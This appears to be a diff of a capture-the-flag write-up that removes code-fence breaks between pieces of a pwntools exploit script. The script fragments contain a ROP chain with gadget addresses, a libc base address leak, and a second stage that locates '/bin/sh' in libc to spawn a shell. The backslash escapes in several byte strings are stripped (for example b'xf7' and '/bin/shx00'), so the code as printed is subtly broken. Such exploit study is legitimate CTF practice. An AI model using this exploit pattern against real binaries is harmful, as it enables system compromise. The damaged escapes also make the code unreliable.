@@ -176,11 +176,6 @@ for i in range(10):
 # overwrite idx->13
 p.sendline(b'13')
 sleep(0.2)
-```
-
-
-
-```
 # rop1
 main = 0x8049264
 pop_ebx_ret = 0x08049022
@@ -203,11 +198,6 @@ p.recvuntil(b'Recording completedn')
 libc_base = u32(p.recvuntil(b'xf7')[-4:].ljust(4, b'x00')) - 0x6d1e0
 libc.address = libc_base
 success("libc_base = " + hex(libc_base))
-```
-
-
-
-```
 # rop2
 for i in range(10):
     p.sendline(b'57005') # 0x1234
@@ -231,11 +221,6 @@ p.sendline(str(to_signed(next(libc.search(b'/bin/shx00')))).encode())
 sleep(0.2)
 
 p.sendline(b'0')
-```
-
-
-
-```
 from pwn import *
 
 elf = ELF("./account")
